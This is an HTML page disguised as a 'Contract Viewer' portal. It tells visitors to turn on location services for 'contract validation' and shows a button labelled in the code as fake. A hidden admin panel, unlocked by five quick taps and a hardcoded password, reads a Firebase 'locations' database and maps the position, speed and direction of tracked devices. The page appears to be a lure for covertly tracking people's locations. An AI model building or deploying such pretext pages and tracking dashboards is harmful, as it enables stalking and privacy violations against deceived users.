<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Project Access Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f5f5f5;
      color: #222;
    }
    header {
      background-color: #1a1a1a;
      color: white;
      padding: 15px;
      text-align: center;
      font-size: 1.5em;
    }
    .content {
      padding: 30px;
      max-width: 700px;
      margin: auto;
      line-height: 1.7;
    }
    .fake-button {
      background-color: #3a7bd5;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 1.2em;
      margin-top: 20px;
      border-radius: 8px;
      cursor: pointer;
    }
    .footer {
      text-align: center;
      margin-top: 40px;
      font-size: 0.9em;
      color: #888;
    }
    #admin-login {
      display: none;
      text-align: center;
      margin-top: 40px;
    }
    #admin-panel {
      display: none;
      padding: 20px;
    }
    .hidden {
      display: none;
    }
    #map {
      width: 100%;
      height: 60vh;
      margin-top: 20px;
      border-radius: 10px;
    }
    .device-info {
      margin-top: 15px;
      font-size: 0.9em;
      background: #fff;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 0 4px rgba(0,0,0,0.2);
    }
    input[type="password"] {
      padding: 10px;
      font-size: 1em;
      width: 200px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      padding: 10px 20px;
      margin-top: 10px;
      font-size: 1em;
      border-radius: 6px;
      border: none;
      background-color: #333;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>

<header>Contract Viewer</header>

<div class="content">
  <p>Welcome to the official contract viewer portal. You can access your active engagement documents here.</p>
  <p><strong>Note:</strong> To verify your access, please ensure your device's location service is turned on. This is required for contract validation.</p>
  <button class="fake-button">Access Contract</button>
  <div class="footer">Secure Contract Access &copy; 2025</div>
</div>

<!-- Hidden Admin Login -->
<div id="admin-login">
  <h3>Admin Access</h3>
  <p>Enter Password:</p>
  <input type="password" id="admin-pass" placeholder="Password">
  <br>
  <button onclick="checkAdmin()">Login</button>
</div>

<!-- Hidden Admin Panel -->
<div id="admin-panel">
  <h2>Admin Dashboard</h2>
  <div id="map"></div>
  <div id="device-list"></div>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />

<script>
  // Firebase Config
  const firebaseConfig = {
    apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
    authDomain: "gps-d0bab.firebaseapp.com",
    databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
    projectId: "gps-d0bab",
    storageBucket: "gps-d0bab.appspot.com",
    messagingSenderId: "810816177909",
    appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // Hidden Admin Trigger
  let tapCount = 0;
  let lastTap = 0;

  document.body.addEventListener('click', () => {
    const now = Date.now();
    if (now - lastTap < 1000) {
      tapCount++;
    } else {
      tapCount = 1;
    }
    lastTap = now;

    if (tapCount >= 5) {
      document.getElementById('admin-login').style.display = 'block';
      window.scrollTo(0, 0);
    }
  });

  function checkAdmin() {
    const pass = document.getElementById("admin-pass").value;
    if (pass === "ASCII") {
      document.getElementById("admin-login").style.display = "none";
      document.getElementById("admin-panel").style.display = "block";
      loadAdminMap();
    } else {
      alert("Incorrect password.");
    }
  }

  function loadAdminMap() {
    const map = L.map('map').setView([6.5244, 3.3792], 6);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    db.ref("locations").on("value", (snapshot) => {
      const devices = snapshot.val();
      const deviceList = document.getElementById("device-list");
      deviceList.innerHTML = "";

      for (const key in devices) {
        const { latitude, longitude, timestamp, speed = "?", direction = "?" } = devices[key];
        const marker = L.marker([latitude, longitude]).addTo(map);
        marker.bindPopup(`Device: ${key}<br>Speed: ${speed}<br>Direction: ${direction}`);

        const timeString = new Date(timestamp).toLocaleString();
        const link = `https://maps.google.com/?q=${latitude},${longitude}`;
        deviceList.innerHTML += `
          <div class="device-info">
            <strong>Device:</strong> ${key}<br>
            <strong>Time:</strong> ${timeString}<br>
            <strong>Speed:</strong> ${speed}<br>
            <strong>Direction:</strong> ${direction}<br>
            <a href="${link}" target="_blank">View on Map</a>
          </div>`;
      }
    });
  }
</script>

</body>
</html>
